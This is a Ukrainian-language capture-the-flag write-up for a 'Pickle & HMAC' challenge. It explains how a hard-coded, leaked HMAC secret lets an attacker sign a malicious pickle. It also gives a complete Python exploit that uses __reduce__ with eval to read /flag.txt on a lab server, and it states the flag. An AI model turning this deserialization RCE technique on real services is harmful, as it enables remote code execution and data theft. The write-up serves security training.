# 04. Pickle & HMAC (300 балів) — розв'язок

Прапор: `CTF{d3s3r14l1z4t10n_hm4c_byp4ss}`

## Вразливість

`/upload` приймає Base64-серіалізований pickle та HMAC-SHA256. HMAC перевіряється
перед `pickle.loads`, але секрет жорстко зашитий у код і відкритий на `/source`:

```python
SECRET = b"titan_weak_key_123"
expected_sign = hmac.new(SECRET, payload.encode(), hashlib.sha256).hexdigest()
...
obj = pickle.loads(base64.b64decode(payload))
return view(f"Hello, {obj.name}", "ok")
```

Підпис рахується від Base64-рядка (а не від сирих байтів), тому підписуємо саме
той рядок, який надсилаємо. Далі — RCE через `__reduce__`.

## Експлойт

`__reduce__` виконує `eval`, який створює безіменний клас з атрибутом `name`, що
містить вміст `/flag.txt`. Сервер звертається до `obj.name` і повертає прапор у
відповіді.

```python
import base64, hashlib, hmac, pickle, requests

BASE = "http://10.10.15.124:8004"          # через VPN: http://172.28.0.14:5000
SECRET = b"titan_weak_key_123"             # витік через /source

class Exploit:
    def __reduce__(self):
        return (eval, ("type('X',(object,),{'name':open('/flag.txt').read()})()",))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
sign = hmac.new(SECRET, payload.encode(), hashlib.sha256).hexdigest()

r = requests.post(f"{BASE}/upload", data={"sign": sign, "payload": payload})
print(r.text)
```

У відповіді буде `Hello, CTF{d3s3r14l1z4t10n_hm4c_byp4ss}`.

## Прапор

```text
CTF{d3s3r14l1z4t10n_hm4c_byp4ss}
```
